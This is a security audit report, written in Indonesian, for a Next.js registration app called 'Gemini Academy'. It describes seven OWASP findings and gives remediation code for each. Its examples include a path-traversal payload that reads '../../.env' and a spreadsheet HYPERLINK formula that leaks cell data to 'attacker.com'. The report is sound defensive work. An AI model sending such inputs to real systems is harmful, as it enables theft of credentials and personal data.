# Laporan Audit Keamanan Kode & Panduan Remediasi (DevSecOps)

**Aplikasi:** Gemini Academy Next.js  
**Tanggal Audit:** 23 Oktober 2026  
**Standar Keamanan:** OWASP Top 10 (Static Application Security Testing - SAST)  
**Auditor:** Cyber Security Engineer & Code Auditor  

---

## 1. Ringkasan Eksekutif (Executive Summary)

Audit keamanan statis dilakukan pada seluruh repositori aplikasi pendaftaran berbasis Next.js (`gemini-academy-nextjs`). Fokus peninjauan mencakup validasi input, sanitasi, alur data (*data flow*) dari rute API hingga basis data MySQL, manajemen sesi, kontrol akses objek, penanganan berkas unggahan, serta konfigurasi keamanan HTTP.

### Matriks Tingkat Keparahan (Severity Matrix)

| ID | Jenis Kerentanan | Severity | OWASP Top 10 | Status |
|---|---|:---:|---|:---:|
| **SEC-01** | Arbitrary File Read / Path Traversal via Unvalidated `letter_file` | **Kritis** | A01: Broken Access Control | Perlu Diperbaiki |
| **SEC-02** | Broken Access Control & Business Logic Bypass pada Kuota Unit Kerja | **Tinggi** | A01: Broken Access Control | Perlu Diperbaiki |
| **SEC-03** | CSV / Spreadsheet Formula Injection pada Fitur Export Data | **Tinggi** | A03: Injection | Perlu Diperbaiki |
| **SEC-04** | Insecure File Upload Handling & Missing MIME / Sniffing Protection | **Sedang** | A04: Insecure Design | Perlu Diperbaiki |
| **SEC-05** | CSRF Origin Validation Weakness & Missing Anti-CSRF Token | **Sedang** | A01: Broken Access Control | Perlu Diperbaiki |
| **SEC-06** | Denial of Service (DoS) via Account Lockout & Missing Rate Limiting | **Sedang** | A04: Insecure Design | Perlu Diperbaiki |
| **SEC-07** | Security Misconfiguration - Missing HTTP Security Headers | **Rendah** | A05: Security Misconfiguration | Perlu Diperbaiki |

---

## 2. Temuan Keamanan & Rekomendasi Remediasi

---

### Temuan SEC-01

* **Jenis Kerentanan:** Arbitrary File Read / Path Traversal
* **Severity:** **Kritis** (CVSS v3.1: 9.8)
* **Lokasi:** `app/api/[...path]/route.js` (Baris 134–136 dan Baris 63–70)
* **Dampak Eksploitasi:**
  Penyerang tanpa otentikasi dapat mengirimkan payload JSON/FormData pada endpoint registrasi `POST /api/register` dengan menyertakan string acak pada field `letter_file`, misalnya:
  ```json
  {
    "name": "Attacker",
    "nip": "199001012020121001",
    "unit": "Fakultas Teknik",
    "phone": "081234567890",
    "profession": "Dosen",
    "employment_status": "PNS",
    "academy_session_id": 1,
    "letter_file": "../../.env"
  }
  ```
  Nilai ini disimpan langsung ke dalam tabel `participants.letter_file`. Server kemudian memberikan cookie `academy_receipt` yang valid untuk pendaftar tersebut. Penyerang selanjutnya memanggil `GET /api/participants/<id>/letter`. 
  
  Karena fungsi pembacaan berkas menggunakan `path.join(process.cwd(), "uploads", "letters", r[0].letter_file)`, path akan ter-resolve menuju berkas di luar folder upload (`.env`). Server membaca berkas tersebut dan mengirimkannya ke penyerang, yang berakibat pada kebocoran menyeluruh terhadap kredensial database, password hash, dan informasi rahasia sistem.

* **Kode Perbaikan (Remediation):**

1. Pada handler `POST /api/register` (`app/api/[...path]/route.js`), hapus penerimaan `bodyData.letter_file` secara mentah. Wajibkan unggahan berkas asli yang telah lolos validasi ekstensi:
```javascript
      if (
        letterFile &&
        typeof letterFile === "object" &&
        typeof letterFile.arrayBuffer === "function" &&
        letterFile.size > 0
      ) {
        if (letterFile.size > 5 * 1024 * 1024) {
          errors.push("Ukuran surat usulan pimpinan unit kerja maksimal 5 MB.");
        }
        const origName = letterFile.name || "";
        const ext = path.extname(origName).toLowerCase();
        const allowedExts = [".pdf", ".jpg", ".jpeg", ".png"];
        if (!allowedExts.includes(ext)) {
          errors.push("Format surat usulan harus berupa file PDF, JPG, atau PNG.");
        } else {
          savedFileName = `${randomUUID()}${ext}`;
          bufferToSave = Buffer.from(await letterFile.arrayBuffer());
        }
      } else {
        errors.push("Surat usulan pimpinan unit kerja wajib diunggah.");
      }
```

2. Pada endpoint pembacaan surat `GET /api/participants/[id]/letter` (`app/api/[...path]/route.js`), pastikan nama file disanitasi menggunakan `path.basename` dan jalur kanonikal diverifikasi dengan `path.resolve`:
```javascript
      const safeFilename = path.basename(r[0].letter_file);
      const uploadDir = path.resolve(process.cwd(), "uploads", "letters");
      const filePath = path.resolve(uploadDir, safeFilename);

      // Verifikasi pembatasan direktori (mencegah directory traversal)
      if (!filePath.startsWith(uploadDir + path.sep)) {
        return json({ error: "Akses berkas tidak sah." }, 403);
      }
```

---

### Temuan SEC-02

* **Jenis Kerentanan:** Broken Access Control & Business Logic Bypass pada Kuota Unit Kerja
* **Severity:** **Tinggi**
* **Lokasi:** `app/api/[...path]/route.js` (Baris 153–171) & `lib/validation.js` (Baris 7)
* **Dampak Eksploitasi:**
  Pengecekan batas kuota pada saat pendaftaran hanya dilakukan apabila unit kerja ditemukan di dalam database:
  ```javascript
  const [unitRows] = await conn.execute(
    "SELECT id, name, max_quota FROM work_units WHERE name = ? FOR UPDATE",
    [d.unit]
  );
  if (unitRows.length > 0) { ... }
  ```
  Di sisi validasi (`lib/validation.js`), parameter `d.unit` hanya diverifikasi panjang karakternya (`d.unit.length > 200`), tanpa mencocokkannya ke daftar resmi unit kerja yang ada.
  
  Pengguna atau penyerang dapat mengirimkan nama unit yang dimodifikasi (misal: `"Fakultas Teknik "` dengan trailing space atau nama buatan). Akibatnya, `unitRows.length` bernilai `0`, pengecekan kuota dilewati (*bypassed*), dan pendaftar dapat masuk melebihi batas maksimal pengusulan unit kerja yang telah ditetapkan institusi.

* **Kode Perbaikan (Remediation):**

Perbarui logika transaksi pendaftaran di `app/api/[...path]/route.js` agar mewajibkan unit kerja terdaftar secara valid di tabel `work_units`:
```javascript
        const [unitRows] = await conn.execute(
          "SELECT id, name, max_quota FROM work_units WHERE name = ? FOR UPDATE",
          [d.unit]
        );
        if (unitRows.length === 0) {
          await conn.rollback();
          return json(
            { error: "Unit kerja yang dipilih tidak valid atau belum terdaftar." },
            422
          );
        }

        const [[countRow]] = await conn.execute(
          "SELECT COUNT(*) AS used FROM participants WHERE unit = ? FOR UPDATE",
          [d.unit]
        );
        if (countRow.used >= unitRows[0].max_quota) {
          await conn.rollback();
          return json(
            {
              error: `Kuota untuk ${d.unit} sudah penuh (maksimal ${unitRows[0].max_quota} peserta).`,
            },
            409
          );
        }
```

---

### Temuan SEC-03

* **Jenis Kerentanan:** CSV / Spreadsheet Formula Injection (Formula Injection / CWE-1236)
* **Severity:** **Tinggi**
* **Lokasi:** `lib/excel.js` (Baris 25–31)
* **Dampak Eksploitasi:**
  Data pendaftar seperti nama, unit kerja, email, dan NIP dimasukkan langsung ke lembar kerja Excel oleh fungsi `participantWorkbook()` tanpa proses sanitasi karakter formula.
  
  Meskipun helper `csvCell` sudah dibuat di `lib/validation.js`, helper tersebut tidak digunakan pada generator Excel. Pendaftar yang memasukkan nama seperti:
  `=HYPERLINK("https://attacker.com/leak?data="&A2, "Klik Verifikasi")` atau formula kalkulasi sistem operasi (DDE) dapat memicu eksekusi otomatis atau kebocoran data saat administrator membuka berkas Excel hasil ekspor di Microsoft Excel atau LibreOffice.

* **Kode Perbaikan (Remediation):**

Tambahkan fungsi pembatas sel teks (`sanitizeCell`) pada `lib/excel.js` untuk membungkus karakter awal formula dengan kutip tunggal (`'`):
```javascript
import ExcelJS from 'exceljs';

function sanitizeCell(value) {
  if (value === null || value === undefined) return '';
  const str = String(value);
  // Netralkan karakter awalan formula agar diperlakukan murni sebagai teks
  if (/^[=+\-@\t\r\n]/.test(str)) {
    return "'" + str;
  }
  return str;
}

export async function participantWorkbook(participants) {
  const workbook = new ExcelJS.Workbook();
  workbook.creator = 'Gemini Academy';
  const sheet = workbook.addWorksheet('Peserta', {views: [{state: 'frozen', ySplit: 1}]});
  
  sheet.columns = [
    {header: 'No.', key: 'no', width: 7},
    {header: 'Nama Lengkap', key: 'name', width: 32},
    {header: 'NIP', key: 'nip', width: 24},
    {header: 'Unit Kerja', key: 'unit', width: 38},
    {header: 'WhatsApp', key: 'phone', width: 22},
    {header: 'Email Unhas', key: 'email', width: 36},
    {header: 'Sesi', key: 'session', width: 14},
    {header: 'Waktu (WITA)', key: 'time', width: 22},
    {header: 'Tanggal Daftar (WITA)', key: 'registered', width: 26},
    {header: 'Kode Pendaftaran', key: 'code', width: 40},
    {header: 'Kategori Profesi', key: 'profession', width: 20},
    {header: 'Status Kepegawaian', key: 'employment_status', width: 22},
    {header: 'Surat Usulan', key: 'letter', width: 18},
  ];

  for (const [index, p] of participants.entries()) {
    const utc = p.created_at instanceof Date ? p.created_at : new Date(p.created_at.replace(' ', 'T') + 'Z');
    sheet.addRow({
      no: index + 1,
      name: sanitizeCell(p.name),
      nip: sanitizeCell(p.nip),
      unit: sanitizeCell(p.unit),
      phone: sanitizeCell(p.phone),
      email: p.email ? sanitizeCell(p.email) : '',
      session: sanitizeCell(p.session),
      time: p.starts_at + '–' + p.ends_at,
      registered: new Date(utc.getTime() + 8 * 3600000),
      code: sanitizeCell(p.registration_code),
      profession: p.profession ? sanitizeCell(p.profession) : '',
      employment_status: p.employment_status ? sanitizeCell(p.employment_status) : '',
      letter: p.letter_file ? 'Ada' : 'Tidak Ada',
    });
  }

  for (const key of ['nip', 'phone', 'code']) sheet.getColumn(key).numFmt = '@';
  sheet.getColumn('registered').numFmt = 'dd/mm/yyyy hh:mm:ss';
  sheet.autoFilter = {from: 'A1', to: 'M' + Math.max(1, sheet.rowCount)};
  sheet.getRow(1).height = 30;
  sheet.getRow(1).eachCell(cell => {
    cell.fill = {type: 'pattern', pattern: 'solid', fgColor: {argb: 'FF284478'}};
    cell.font = {bold: true, color: {argb: 'FFFFFFFF'}};
    cell.alignment = {vertical: 'middle', wrapText: true};
  });
  sheet.eachRow((row, i) => {
    if (i === 1) return;
    row.alignment = {vertical: 'top', wrapText: true};
    if (i % 2 === 0) row.eachCell(cell => {cell.fill = {type: 'pattern', pattern: 'solid', fgColor: {argb: 'FFF0F4FB'}};});
  });
  return workbook.xlsx.writeBuffer();
}
```

---

### Temuan SEC-04

* **Jenis Kerentanan:** Insecure File Upload Handling & Missing MIME / Sniffing Protection
* **Severity:** **Sedang**
* **Lokasi:** `app/api/[...path]/route.js` (Baris 125–130 dan Baris 79–85)
* **Dampak Eksploitasi:**
  1. Validasi berkas hanya mengandalkan ekstensi nama berkas asli dari klien (`path.extname(origName)`) tanpa memeriksa tanda tangan berkas (*Magic Bytes*). Penyerang dapat mengunggah berkas skrip jahat (seperti HTML dengan payload XSS) yang disamarkan menjadi `.pdf` atau `.png`.
  2. Saat disajikan pada endpoint pengunduhan, berkas dikirimkan dengan header `Content-Disposition: inline` dan tidak menyertakan `X-Content-Type-Options: nosniff`. Peramban berpotensi melakukan *MIME sniffing* dan mengeksekusi skrip di dalam konteks domain aplikasi.

* **Kode Perbaikan (Remediation):**

1. Periksa *magic bytes* sebelum menyimpan berkas:
```javascript
        const buffer = Buffer.from(await letterFile.arrayBuffer());
        const origName = letterFile.name || "";
        const ext = path.extname(origName).toLowerCase();

        // Validasi header biner file (Magic Bytes)
        const isPdf = buffer.subarray(0, 4).toString("ascii") === "%PDF";
        const isJpg = buffer[0] === 0xff && buffer[1] === 0xd8 && buffer[2] === 0xff;
        const isPng = buffer[0] === 0x89 && buffer[1] === 0x50 && buffer[2] === 0x4e && buffer[3] === 0x47;

        if (
          (ext === ".pdf" && !isPdf) ||
          ((ext === ".jpg" || ext === ".jpeg") && !isJpg) ||
          (ext === ".png" && !isPng)
        ) {
          errors.push("Isi berkas tidak valid. Harap unggah berkas PDF, JPG, atau PNG yang sah.");
        } else {
          savedFileName = `${randomUUID()}${ext}`;
          bufferToSave = buffer;
        }
```

2. Pada saat penyajian berkas, gunakan `Content-Disposition: attachment` dan sertakan proteksi sniffing:
```javascript
        return new Response(fileBuffer, {
          headers: {
            "Content-Type": mime,
            "Content-Disposition": `attachment; filename="surat-usulan-${id}${ext}"`,
            "X-Content-Type-Options": "nosniff",
            "Cache-Control": "private, no-store",
          },
        });
```

---

### Temuan SEC-05

* **Jenis Kerentanan:** CSRF Origin Validation Weakness & Missing Anti-CSRF Token
* **Severity:** **Sedang**
* **Lokasi:** `app/api/[...path]/route.js` (Baris 23–27) & `lib/auth.js` (Baris 6)
* **Dampak Eksploitasi:**
  Pengecekan CSRF saat ini hanya membandingkan `req.headers.get("origin")` dengan `process.env.APP_ORIGIN || url.origin`. Jika `APP_ORIGIN` tidak didefinisikan pada environment produksi, aplikasi mengandalkan `url.origin` yang diekstrak langsung dari URL request. Host header dapat dimanipulasi (*Host Header Poisoning*) bila berada di balik *reverse proxy* yang tidak memvalidasi header Host.
  
  Selain itu, operasi administratif mutasi state (`POST /api/units`, `POST /api/units/delete`, `POST /api/logout`) tidak menggunakan Anti-CSRF token tambahan.

* **Kode Perbaikan (Remediation):**

Wajibkan kecocokan `Origin` dengan domain resmi aplikasi yang telah ditentukan di konfigurasi (`APP_ORIGIN`), serta tolak permintaan jika header `Origin` hilang atau tidak sesuai:
```javascript
    const origin = req.headers.get("origin");
    const allowedOrigin = process.env.APP_ORIGIN;

    if (req.method === "POST") {
      if (!origin || !allowedOrigin || origin !== allowedOrigin) {
        return json({ error: "Permintaan ditolak: Origin tidak valid." }, 403);
      }
    }
```

---

### Temuan SEC-06

* **Jenis Kerentanan:** Denial of Service (DoS) via Account Lockout & Missing Rate Limiting
* **Severity:** **Sedang**
* **Lokasi:** `app/api/[...path]/route.js` (Baris 233–248 dan Baris 90)
* **Dampak Eksploitasi:**
  1. Mekanisme pembatasan login administrator hanya didasarkan pada hash email (`email_hash`) tanpa memperhitungkan alamat IP pemohon. Penyerang dapat mengirimkan 5 percobaan kata sandi salah secara berkala untuk akun administrator, mengakibatkan administrator sah terkunci secara permanen (*Account Lockout DoS*).
  2. Endpoint publik registrasi `POST /api/register` tidak memiliki *rate limiter*. Bot dapat menghabiskan kuota 230 kursi dalam hitungan detik dan membanjiri ruang disk server dengan unggahan file 5 MB bertubi-tubi.

* **Kode Perbaikan (Remediation):**

1. Gabungkan hash alamat IP klien dan email target untuk pembatasan login:
```javascript
      const clientIp =
        req.headers.get("x-forwarded-for")?.split(",")[0].trim() ||
        req.headers.get("x-real-ip") ||
        "127.0.0.1";
      const normalized = email.trim().toLowerCase();
      // Kunci rate limit mengombinasikan IP dan Email
      const rateLimitKey = digest(`${clientIp}:${normalized}`);

      await c.execute(
        "INSERT INTO login_attempts(email_hash,attempts,reset_at) VALUES(?,0,DATE_ADD(UTC_TIMESTAMP(),INTERVAL 1 MINUTE)) ON DUPLICATE KEY UPDATE email_hash=email_hash",
        [rateLimitKey]
      );
      const [a] = await c.execute(
        "SELECT attempts,reset_at>UTC_TIMESTAMP() AS active FROM login_attempts WHERE email_hash=? FOR UPDATE",
        [rateLimitKey]
      );
      if (a[0].active && a[0].attempts >= 5) {
        await c.rollback();
        return json(
          { error: "Terlalu banyak percobaan dari alamat IP Anda. Coba kembali dalam satu menit." },
          429
        );
      }
```

---

### Temuan SEC-07

* **Jenis Kerentanan:** Security Misconfiguration - Missing HTTP Security Headers
* **Severity:** **Rendah**
* **Lokasi:** Konfigurasi Server Next.js
* **Dampak Eksploitasi:**
  Aplikasi belum menerapkan konfigurasi header keamanan dasar seperti *Content Security Policy* (CSP), *X-Frame-Options*, dan *HSTS*. Hal ini membuat aplikasi lebih rentan terhadap serangan *Clickjacking*, injeksi skrip perantara, dan penurunan tingkat enkripsi protokol.

* **Kode Perbaikan (Remediation):**

Tambahkan file konfigurasi `next.config.mjs` pada *root* proyek:
```javascript
/** @type {import('next').NextConfig} */
const nextConfig = {
  poweredByHeader: false,
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          { key: "X-Frame-Options", value: "DENY" },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
          {
            key: "Strict-Transport-Security",
            value: "max-age=31536000; includeSubDomains; preload",
          },
          {
            key: "Content-Security-Policy",
            value:
              "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self';",
          },
        ],
      },
    ];
  },
};

export default nextConfig;
```

---

## 3. Checklist Verifikasi Pasca Patching

- [ ] Pastikan tidak ada rute yang menerima `letter_file` selain dari berkas yang diunggah dan lolos verifikasi biner.
- [ ] Uji input traversal (`../../.env`) pada endpoint `POST /api/register` dan `GET /api/participants/:id/letter` untuk memastikan respons bernilai `403` / `422`.
- [ ] Lakukan uji ekspor Excel dengan nama peserta `=1+1` atau formula kalkulasi, lalu verifikasi bahwa sel tersebut diawali dengan prefix `'`.
- [ ] Jalankan pengujian unit otomatis (`npm test`) untuk memastikan tidak ada fungsionalitas aplikasi yang terganggu.
- [ ] Pastikan variabel lingkungan `APP_ORIGIN` terisi di file `.env` produksi dengan protokol `https://`.
